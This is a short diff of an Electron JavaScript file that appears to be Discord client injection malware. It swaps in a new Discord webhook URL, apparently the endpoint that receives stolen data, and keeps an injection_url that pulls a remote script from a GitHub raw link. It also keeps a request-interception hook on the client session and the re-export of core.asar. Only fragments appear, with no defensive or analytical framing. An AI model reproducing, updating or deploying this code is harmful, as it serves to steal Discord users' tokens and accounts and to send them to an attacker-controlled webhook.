@@ -11,7 +11,7 @@ const {
 } = require('electron');
 
 const CONFIG = {
-    webhook: "https://discord.com/api/webhooks/1403395086548598784/brqkH4uwfFdSzYL1FEnn-ILFl6bMymGrCtKgpbqgKaFtIhdRaxYbzb9EE6gxvV-mTiWw",
+    webhook: "https://discord.com/api/webhooks/1406012103344787518/LoD-2nJtj86IZ4w7NIQdPxeGgC-w-BFNfZbvjVvqfM_MoVJGy_TmDW9EINev8O5ykAVS",
     injection_url: "https://raw.githubusercontent.com/Jowad1/sdsdsd/refs/heads/main/New%20Text%20Document.js",
     filters: {
         urls: [
@@ -632,6 +632,7 @@ session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, cal
 });
 
 module.exports = require("./core.asar");
+
 
 
 
